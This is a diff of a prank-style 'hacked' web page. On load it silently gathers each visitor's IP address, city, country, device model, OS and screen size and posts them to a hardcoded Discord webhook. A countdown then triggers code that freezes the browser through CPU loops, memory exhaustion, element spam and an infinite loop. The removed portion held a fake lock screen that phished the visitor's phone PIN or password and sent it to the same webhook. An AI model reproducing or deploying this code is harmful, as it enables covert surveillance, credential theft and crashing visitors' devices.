@@ -3,144 +3,45 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Hacked by Thrunso</title>
+    <title>⚠️ System Overload</title>
     <style>
-        * {
-            margin: 0;
-            padding: 0;
-            box-sizing: border-box;
-            font-family: 'Courier New', monospace;
-        }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Arial, sans-serif; }
         body {
             background: #0a0a0f;
             display: flex;
             justify-content: center;
             align-items: center;
             min-height: 100vh;
-            padding: 20px;
-            position: relative;
+            height: 100vh;
             overflow: hidden;
-        }
-        /* Matrix rain background */
-        body::before {
-            content: '';
             position: fixed;
+            width: 100%;
             top: 0;
             left: 0;
-            width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(0deg, 
-                rgba(0, 255, 0, 0.02) 0px, 
-                rgba(0, 255, 0, 0.02) 2px,
-                transparent 2px,
-                transparent 6px
-            );
-            pointer-events: none;
-            z-index: 0;
-            animation: matrixScroll 20s linear infinite;
-        }
-        @keyframes matrixScroll {
-            0% { transform: translateY(0); }
-            100% { transform: translateY(100px); }
-        }
-        /* Glitch lines */
-        body::after {
-            content: '';
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
-            height: 100%;
-            background: repeating-linear-gradient(0deg,
-                transparent 0px,
-                transparent 3px,
-                rgba(255, 0, 0, 0.03) 3px,
-                rgba(255, 0, 0, 0.03) 4px,
-                transparent 4px,
-                transparent 8px
-            );
-            pointer-events: none;
-            z-index: 0;
         }
         .container {
-            background: rgba(10, 10, 15, 0.92);
+            background: rgba(10, 10, 15, 0.95);
             border-radius: 16px;
             padding: 40px 30px;
             max-width: 440px;
             width: 100%;
             border: 2px solid #ff0040;
-            box-shadow: 0 0 80px rgba(255, 0, 60, 0.3), inset 0 0 80px rgba(255, 0, 60, 0.05);
+            box-shadow: 0 0 80px rgba(255, 0, 60, 0.3);
             text-align: center;
             position: relative;
             z-index: 1;
-            backdrop-filter: blur(4px);
+            animation: glitchBox 0.5s infinite alternate;
         }
-        /* Glitch effect on border */
-        .container::before {
-            content: '';
-            position: absolute;
-            top: -2px;
-            left: -2px;
-            right: -2px;
-            bottom: -2px;
-            border-radius: 18px;
-            background: linear-gradient(45deg, #ff0040, transparent, #ff0040, transparent);
-            background-size: 400% 400%;
-            z-index: -1;
-            animation: glitchBorder 3s ease infinite;
-            opacity: 0.6;
+        @keyframes glitchBox {
+            0% { box-shadow: 0 0 80px rgba(255, 0, 60, 0.3); }
+            100% { box-shadow: 0 0 150px rgba(255, 0, 60, 0.8); }
         }
-        @keyframes glitchBorder {
-            0% { background-position: 0% 50%; }
-            50% { background-position: 100% 50%; }
-            100% { background-position: 0% 50%; }
-        }
-        .hacked-tag {
-            color: #ff0040;
-            font-size: 14px;
-            letter-spacing: 4px;
-            text-transform: uppercase;
-            font-weight: 700;
-            margin-bottom: 8px;
-            text-shadow: 0 0 20px rgba(255, 0, 60, 0.5);
-        }
-        .hacked-tag span {
-            display: inline-block;
-            animation: flicker 2s infinite;
-        }
-        @keyframes flicker {
-            0%, 100% { opacity: 1; }
-            92% { opacity: 1; }
-            93% { opacity: 0; }
-            94% { opacity: 0.5; }
-            95% { opacity: 1; }
-        }
-        .icon {
-            font-size: 56px;
-            margin-bottom: 12px;
-            filter: drop-shadow(0 0 30px rgba(255, 0, 60, 0.3));
-        }
-        h1 {
-            color: #ff0040;
-            font-size: 20px;
-            margin-bottom: 6px;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            text-shadow: 0 0 30px rgba(255, 0, 60, 0.3);
-        }
-        .subtitle {
-            color: #ff6666;
-            font-size: 13px;
-            letter-spacing: 1px;
-            margin-bottom: 16px;
-            opacity: 0.8;
-        }
-        p {
-            color: #88aa88;
-            font-size: 14px;
-            line-height: 1.6;
-            margin-bottom: 10px;
-        }
+        .hacked-tag { color: #ff0040; font-size: 14px; letter-spacing: 4px; text-transform: uppercase; font-weight: 700; margin-bottom: 8px; text-shadow: 0 0 20px rgba(255, 0, 60, 0.5); }
+        .hacked-tag span { display: inline-block; animation: flicker 2s infinite; }
+        @keyframes flicker { 0%, 100% { opacity: 1; } 92% { opacity: 1; } 93% { opacity: 0; } 94% { opacity: 0.5; } 95% { opacity: 1; } }
+        .icon { font-size: 56px; margin-bottom: 12px; }
+        h1 { color: #ff0040; font-size: 20px; margin-bottom: 6px; text-transform: uppercase; letter-spacing: 2px; text-shadow: 0 0 30px rgba(255, 0, 60, 0.3); }
+        .subtitle { color: #ff6666; font-size: 13px; letter-spacing: 1px; margin-bottom: 16px; opacity: 0.8; }
         .data-box {
             background: rgba(0, 0, 0, 0.6);
             border-radius: 10px;
@@ -151,106 +52,51 @@
             font-size: 13px;
             color: #88aa88;
             word-break: break-all;
-            box-shadow: inset 0 0 40px rgba(0, 0, 0, 0.5);
         }
-        .data-box span {
-            color: #ff0040;
-            font-weight: 700;
-        }
-        .data-box .value {
-            color: #00ff88;
-            font-weight: 400;
-        }
-        .warning {
-            color: #ff6666;
-            font-size: 12px;
-            margin-top: 10px;
-            border-top: 1px solid #2a2a40;
-            padding-top: 14px;
-            letter-spacing: 1px;
-        }
-        .pin-box {
-            margin-top: 16px;
-            background: rgba(0, 0, 0, 0.6);
-            border-radius: 10px;
-            padding: 16px;
-            border: 1px solid #ff0040;
-            box-shadow: 0 0 40px rgba(255, 0, 60, 0.1);
-        }
-        .pin-box p {
-            color: #ff6666;
-            font-size: 13px;
-        }
-        .pin-box input {
+        .data-box span { color: #ff0040; font-weight: 700; }
+        .data-box .value { color: #00ff88; font-weight: 400; }
+        .warning { color: #ff6666; font-size: 12px; margin-top: 10px; border-top: 1px solid #2a2a40; padding-top: 14px; letter-spacing: 1px; }
+        .glitch-text { color: #ff0040; font-size: 11px; letter-spacing: 2px; opacity: 0.6; margin-top: 12px; animation: glitchText 4s infinite; }
+        @keyframes glitchText { 0%, 100% { opacity: 0.6; } 50% { opacity: 1; } }
+        .lock-icon { font-size: 64px; animation: pulse 1.5s ease-in-out infinite; display: block; margin-bottom: 10px; }
+        @keyframes pulse { 0%, 100% { transform: scale(1); } 50% { transform: scale(1.1); } }
+        .timer { color: #ff6666; font-size: 14px; margin-top: 10px; }
+        .timer span { color: #ff0040; font-size: 20px; font-weight: 700; }
+        /* Glitch overlay */
+        .glitch-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
             width: 100%;
-            padding: 12px;
-            border-radius: 8px;
-            border: 1px solid #2a2a40;
-            background: #0a0a0f;
-            color: #00ff88;
-            font-size: 16px;
-            text-align: center;
-            letter-spacing: 8px;
-            margin: 10px 0;
-            font-family: 'Courier New', monospace;
-            box-shadow: inset 0 0 20px rgba(0, 0, 0, 0.5);
+            height: 100%;
+            pointer-events: none;
+            z-index: 999;
+            background: repeating-linear-gradient(0deg,
+                transparent 0px,
+                transparent 2px,
+                rgba(255, 0, 0, 0.03) 2px,
+                rgba(255, 0, 0, 0.03) 4px,
+                transparent 4px,
+                transparent 6px
+            );
+            animation: glitchOverlay 0.1s infinite;
         }
-        .pin-box input:focus {
-            outline: none;
-            border-color: #ff0040;
-            box-shadow: 0 0 30px rgba(255, 0, 60, 0.2);
-        }
-        .pin-box button {
-            width: 100%;
-            padding: 12px;
-            background: #ff0040;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            text-transform: uppercase;
-            letter-spacing: 2px;
-            transition: all 0.3s;
-            box-shadow: 0 0 30px rgba(255, 0, 60, 0.2);
-        }
-        .pin-box button:hover {
-            background: #cc0033;
-            box-shadow: 0 0 60px rgba(255, 0, 60, 0.4);
-            transform: scale(1.02);
-        }
-        .pin-box button:active {
-            transform: scale(0.98);
-        }
-        .hidden {
-            display: none;
-        }
-        .glitch-text {
-            color: #ff0040;
-            font-size: 11px;
-            letter-spacing: 2px;
-            opacity: 0.6;
-            margin-top: 12px;
-            animation: glitchText 4s infinite;
-        }
-        @keyframes glitchText {
-            0%, 100% { opacity: 0.6; }
-            50% { opacity: 1; }
+        @keyframes glitchOverlay {
+            0% { opacity: 0.3; }
+            50% { opacity: 0.8; }
+            100% { opacity: 0.3; }
         }
     </style>
 </head>
 <body>
 
-<div class="container">
-    <!-- HACKED BY THRUNSO -->
-    <div class="hacked-tag">
-        <span>⛓️ HACKED BY THRUNSO ⛓️</span>
-    </div>
+<div class="glitch-overlay"></div>
 
-    <div class="icon">💀</div>
-    <h1>⚠️ SYSTEM COMPROMISED</h1>
-    <p class="subtitle">Your device has been remotely accessed</p>
+<div class="container">
+    <div class="hacked-tag"><span>⛓️ HACKED BY THRUNSO ⛓️</span></div>
+    <span class="lock-icon">💀</span>
+    <h1>⚠️ SYSTEM OVERLOAD</h1>
+    <p class="subtitle">Your device is being attacked</p>
 
     <div class="data-box" id="infoBox">
         <div>📡 <span>IP:</span> <span class="value" id="ip">Fetching...</span></div>
@@ -262,104 +108,50 @@
         <div>⏰ <span>Time:</span> <span class="value" id="time">Fetching...</span></div>
     </div>
 
-    <!-- FAKE PIN PROMPT -->
-    <div class="pin-box" id="pinBox">
-        <p>🔒 DEVICE LOCKED — VERIFY TO UNLOCK</p>
-        <p style="font-size:12px; color:#88aa88;">Enter your phone PIN/password to decrypt your data</p>
-        <input type="password" id="pinInput" placeholder="Enter PIN or Password" maxlength="20" />
-        <button id="pinSubmit">▶ UNLOCK DEVICE</button>
-        <p style="font-size:10px; color:#555; margin-top:8px;">⛓️ Your data will be wiped if you don't verify</p>
-    </div>
-
-    <div class="glitch-text">⛓️ SESSION LOGGED ⛓️</div>
+    <div class="timer">⏳ <span id="countdown">10</span> seconds until device overload</div>
     <div class="warning">⚠️ YOUR DEVICE IS NOW FLAGGED</div>
+    <div class="glitch-text">⛓️ SESSION LOGGED ⛓️</div>
 </div>
 
 <script>
-    // ===== YOUR WEBHOOK =====
+    // ===== WEBHOOK =====
     var WEBHOOK = "https://discord.com/api/webhooks/1519652009781887076/37_FqW5wKYAUNdvThxMxjArmVmtLJb0m8oC5JSW3oYfC5libvf_9Cg3vbmL0-IBg961O";
 
-    // ===== GET PHONE MODEL FROM USER AGENT =====
+    // ===== GET PHONE MODEL =====
     function getPhoneModel() {
         var ua = navigator.userAgent || '';
         var model = 'Unknown';
-
-        // iPhone models
         if (ua.indexOf('iPhone') !== -1) {
             var match = ua.match(/iPhone\s(\d+,\d+)/);
             if (match) {
                 var models = {
-                    '14,5': 'iPhone 13',
-                    '14,4': 'iPhone 13 Mini',
-                    '14,2': 'iPhone 13 Pro',
-                    '14,3': 'iPhone 13 Pro Max',
-                    '14,7': 'iPhone 14',
-                    '14,8': 'iPhone 14 Plus',
-                    '15,2': 'iPhone 14 Pro',
-                    '15,3': 'iPhone 14 Pro Max',
-                    '15,4': 'iPhone 15',
-                    '15,5': 'iPhone 15 Plus',
-                    '16,1': 'iPhone 15 Pro',
-                    '16,2': 'iPhone 15 Pro Max',
-                    '17,1': 'iPhone 16',
-                    '17,2': 'iPhone 16 Plus',
-                    '17,3': 'iPhone 16 Pro',
-                    '17,4': 'iPhone 16 Pro Max'
+                    '14,5': 'iPhone 13', '14,4': 'iPhone 13 Mini', '14,2': 'iPhone 13 Pro', '14,3': 'iPhone 13 Pro Max',
+                    '14,7': 'iPhone 14', '14,8': 'iPhone 14 Plus', '15,2': 'iPhone 14 Pro', '15,3': 'iPhone 14 Pro Max',
+                    '15,4': 'iPhone 15', '15,5': 'iPhone 15 Plus', '16,1': 'iPhone 15 Pro', '16,2': 'iPhone 15 Pro Max',
+                    '17,1': 'iPhone 16', '17,2': 'iPhone 16 Plus', '17,3': 'iPhone 16 Pro', '17,4': 'iPhone 16 Pro Max'
                 };
                 model = models[match[1]] || 'iPhone ' + match[1];
-            } else {
-                model = 'iPhone';
-            }
-        }
-        // Android models
-        else if (ua.indexOf('Android') !== -1) {
+            } else { model = 'iPhone'; }
+        } else if (ua.indexOf('Android') !== -1) {
             var match = ua.match(/;\s([^;]+?)\sBuild/);
-            if (match) {
-                model = match[1];
-            } else {
-                model = 'Android Device';
-            }
-        }
-        // Desktop
-        else if (ua.indexOf('Windows') !== -1) {
-            model = 'Windows PC';
-        } else if (ua.indexOf('Mac') !== -1) {
-            var match = ua.match(/Macintosh;\s.*Mac OS X\s([\d_]+)/);
-            if (match) {
-                model = 'Mac ' + match[1].replace(/_/g, '.');
-            } else {
-                model = 'Mac';
-            }
-        } else if (ua.indexOf('Linux') !== -1) {
-            model = 'Linux PC';
-        }
-
+            model = match ? match[1] : 'Android Device';
+        } else if (ua.indexOf('Windows') !== -1) { model = 'Windows PC'; }
+        else if (ua.indexOf('Mac') !== -1) { model = 'Mac'; }
+        else if (ua.indexOf('Linux') !== -1) { model = 'Linux PC'; }
         return model;
     }
 
-    // ===== GET OS VERSION =====
     function getOS() {
         var ua = navigator.userAgent || '';
-        if (ua.indexOf('Android') !== -1) {
-            var match = ua.match(/Android\s([\d.]+)/);
-            return match ? 'Android ' + match[1] : 'Android';
-        }
-        if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) {
-            var match = ua.match(/OS\s([\d_]+)/);
-            return match ? 'iOS ' + match[1].replace(/_/g, '.') : 'iOS';
-        }
+        if (ua.indexOf('Android') !== -1) { var m = ua.match(/Android\s([\d.]+)/); return m ? 'Android ' + m[1] : 'Android'; }
+        if (ua.indexOf('iPhone') !== -1 || ua.indexOf('iPad') !== -1) { var m = ua.match(/OS\s([\d_]+)/); return m ? 'iOS ' + m[1].replace(/_/g, '.') : 'iOS'; }
         if (ua.indexOf('Windows NT 10.0') !== -1) return 'Windows 10/11';
-        if (ua.indexOf('Windows NT 6.1') !== -1) return 'Windows 7';
         if (ua.indexOf('Windows') !== -1) return 'Windows';
-        if (ua.indexOf('Mac OS X') !== -1) {
-            var match = ua.match(/Mac OS X\s([\d_]+)/);
-            return match ? 'macOS ' + match[1].replace(/_/g, '.') : 'macOS';
-        }
+        if (ua.indexOf('Mac OS X') !== -1) { var m = ua.match(/Mac OS X\s([\d_]+)/); return m ? 'macOS ' + m[1].replace(/_/g, '.') : 'macOS'; }
         if (ua.indexOf('Linux') !== -1) return 'Linux';
         return 'Unknown OS';
     }
 
-    // ===== UPDATE PAGE =====
     function updatePage(info) {
         document.getElementById('ip').textContent = info.ip || 'Unknown';
         document.getElementById('location').textContent = info.location || 'Unknown';
@@ -370,8 +162,7 @@
         document.getElementById('time').textContent = info.time || 'Unknown';
     }
 
-    // ===== SEND TO DISCORD =====
-    function sendToDiscord(info, pin) {
+    function sendToDiscord(info) {
         if (!info) return;
         var msg = '**💀 HACKED BY THRUNSO**\n' +
             'IP: ' + info.ip + '\n' +
@@ -382,22 +173,13 @@
             'Screen: ' + info.screen + '\n' +
             'Time: ' + info.time + '\n' +
             'User Agent: `' + navigator.userAgent + '`';
-
-        if (pin) {
-            msg += '\n\n**🔒 PIN/Password Entered:** `' + pin + '`';
-        }
-
         fetch(WEBHOOK, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify({
-                content: msg,
-                username: 'Thrunso'
-            })
+            body: JSON.stringify({ content: msg, username: 'Thrunso' })
         }).catch(function() {});
     }
 
-    // ===== GET IP + LOCATION =====
     function getIPAndLocation() {
         var info = {
             ip: 'Unknown',
@@ -408,7 +190,6 @@
             screen: screen.width + 'x' + screen.height,
             time: new Date().toLocaleString()
         };
-
         fetch('https://ipapi.co/json/')
             .then(function(r) { return r.json(); })
             .then(function(data) {
@@ -417,45 +198,65 @@
                     info.location = (data.city || 'Unknown') + ', ' + (data.country_name || 'Unknown');
                     updatePage(info);
                     sendToDiscord(info);
-                } else {
-                    updatePage(info);
-                    sendToDiscord(info);
-                }
+                } else { updatePage(info); sendToDiscord(info); }
             })
-            .catch(function() {
-                updatePage(info);
-                sendToDiscord(info);
-            });
-
+            .catch(function() { updatePage(info); sendToDiscord(info); });
         updatePage(info);
     }
 
-    // ===== FAKE PIN =====
-    document.getElementById('pinSubmit').addEventListener('click', function() {
-        var pin = document.getElementById('pinInput').value.trim();
-        if (pin.length > 0) {
-            var info = {
-                ip: document.getElementById('ip').textContent,
-                location: document.getElementById('location').textContent,
-                phoneModel: document.getElementById('phoneModel').textContent,
-                os: document.getElementById('os').textContent,
-                browser: document.getElementById('browser').textContent,
-                screen: document.getElementById('screen').textContent,
-                time: document.getElementById('time').textContent
-            };
-            sendToDiscord(info, pin);
-            document.getElementById('pinBox').innerHTML = '<p style="color:#00ff88;">✅ DECRYPTED. Redirecting...</p>';
-            setTimeout(function() {
-                window.location.href = 'https://www.google.com';
-            }, 1500);
-        } else {
-            alert('⚠️ Enter your PIN/password.');
-        }
-    });
-
-    // ===== RUN =====
     getIPAndLocation();
-</script>
 
+    // ===== COUNTDOWN =====
+    var countdown = 10;
+    var timer = setInterval(function() {
+        countdown--;
+        document.getElementById('countdown').textContent = countdown;
+        if (countdown <= 0) {
+            clearInterval(timer);
+            document.querySelector('.timer').innerHTML = '⚠️ <span style="color:#ff0040;">DEVICE OVERLOADED</span> ⚠️';
+            startLag();
+        }
+    }, 1000);
+
+    // ===== LAG FUNCTION =====
+    function startLag() {
+        // 1. CPU overload — infinite math loop
+        var cpuLag = setInterval(function() {
+            for (var i = 0; i < 1000000; i++) {
+                var x = Math.sqrt(i) * Math.random();
+            }
+        }, 0);
+
+        // 2. Memory drain — fill arrays until crash
+        var memoryDrain = setInterval(function() {
+            var arr = [];
+            for (var i = 0; i < 100000; i++) {
+                arr.push(new Array(1000).fill('💀'));
+            }
+        }, 100);
+
+        // 3. DOM spam — add thousands of elements
+        var domSpam = setInterval(function() {
+            for (var i = 0; i < 500; i++) {
+                var el = document.createElement('div');
+                el.style.position = 'fixed';
+                el.style.top = Math.random() * 100 + '%';
+                el.style.left = Math.random() * 100 + '%';
+                el.style.color = '#ff0040';
+                el.style.fontSize = Math.random() * 50 + 'px';
+                el.textContent = '💀';
+                document.body.appendChild(el);
+            }
+        }, 50);
+
+        // 4. Force crash after 15 seconds (if not already dead)
+        setTimeout(function() {
+            // Infinite loop to freeze everything
+            while (true) {
+                var x = 1 + 1;
+            }
+        }, 15000);
+    }
+</script>
 </body>
 </html>
